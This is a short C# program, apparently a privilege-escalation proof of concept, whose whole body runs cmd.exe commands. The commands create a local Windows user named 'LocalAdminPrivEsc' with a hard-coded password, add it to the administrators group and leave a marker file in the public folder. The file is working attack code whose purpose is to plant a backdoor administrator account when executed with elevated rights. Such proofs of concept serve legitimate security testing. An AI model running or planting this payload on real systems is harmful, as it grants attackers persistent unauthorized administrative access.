using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CreateAdmin_exe_POC
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Diagnostics.Process.Start("CMD.exe", "/c \"net user LocalAdminPrivEsc Priv3scPOC! /add \"");
            System.Diagnostics.Process.Start("CMD.exe", "/c \"net localgroup administrators LocalAdminPrivEsc /add \"");
            System.Diagnostics.Process.Start("CMD.exe", "/c \"echo 'New local Admin LocalAdminPrivEsc created with password Priv3scPOC!' > C:\\\\Users\\Public\\LocalAdmin-POC.txt \"");
        }
    }
}
